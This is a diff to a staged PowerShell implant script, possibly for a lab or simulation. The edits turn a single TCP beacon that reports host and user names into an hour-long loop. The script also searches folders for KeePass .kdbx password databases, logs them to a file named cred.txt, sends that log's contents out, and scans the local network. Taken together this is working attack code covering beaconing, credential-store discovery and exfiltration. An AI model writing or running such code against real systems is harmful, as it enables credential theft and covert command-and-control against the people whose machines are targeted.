@@ -16,22 +16,48 @@ $marker = "$root\s1.txt"
 "Executed: $(Get-Date)" |
     Out-File $marker -Encoding UTF8
 
-try {
 
-    $client = New-Object System.Net.Sockets.TCPClient
-    $client.Connect($srv, $beaconPort)
+# ------------------------------------------------------------
+# Stage 1 - periodic one-way beacon
+# ------------------------------------------------------------
 
-    $stream = $client.GetStream()
+$startTime = Get-Date
+$endTime = $startTime.AddHours(1)
 
-    $message = "BEACON|HOST=$env:COMPUTERNAME|USER=$env:USERNAME|TIME=$(Get-Date)"
-    $bytes = [System.Text.Encoding]::ASCII.GetBytes($message)
+while ((Get-Date) -lt $endTime) {
 
-    $stream.Write($bytes, 0, $bytes.Length)
+    try {
 
-    $stream.Close()
-    $client.Close()
+        $client = New-Object System.Net.Sockets.TCPClient
+        $client.Connect($srv, $beaconPort)
+
+        $stream = $client.GetStream()
+
+        $message = "BEACON|HOST=$env:COMPUTERNAME|USER=$env:USERNAME|TIME=$(Get-Date)"
+        $bytes = [System.Text.Encoding]::ASCII.GetBytes($message)
+
+        $stream.Write($bytes, 0, $bytes.Length)
+
+        $stream.Close()
+        $client.Close()
+    }
+    catch {}
+
+    $remaining = $endTime - (Get-Date)
+
+    if ($remaining.TotalSeconds -le 0) {
+        break
+    }
+
+    $sleepSeconds = [Math]::Min(300, [Math]::Ceiling($remaining.TotalSeconds))
+
+    Start-Sleep -Seconds $sleepSeconds
 }
-catch {}
+
+
+# ------------------------------------------------------------
+# Stage 2 - file metadata discovery
+# ------------------------------------------------------------
 
 $discoveryLog = "$resultFolder\cred.txt"
 
@@ -48,7 +74,7 @@ $discoveryLog = "$resultFolder\cred.txt"
     Add-Content $discoveryLog
 
 Get-ChildItem `
-    -Path "C:\" `
+    -Path $dataFolder `
     -Recurse `
     -File `
     -Filter "*.kdbx" `
@@ -71,6 +97,7 @@ Get-ChildItem `
             Add-Content $discoveryLog
     }
 
+
 try {
 
     $body = Get-Content $discoveryLog -Raw
@@ -83,6 +110,11 @@ try {
         -ErrorAction Stop
 }
 catch {}
+
+
+# ------------------------------------------------------------
+# Stage 3 - restricted network discovery
+# ------------------------------------------------------------
 
 $scanResult = "$resultFolder\scan.txt"
 
@@ -100,6 +132,7 @@ $scanResult = "$resultFolder\scan.txt"
 
 "" |
     Add-Content $scanResult
+
 
 1..2 | ForEach-Object {
 
@@ -132,6 +165,7 @@ $scanResult = "$resultFolder\scan.txt"
 
     Start-Sleep -Milliseconds 250
 }
+
 
 try {
 
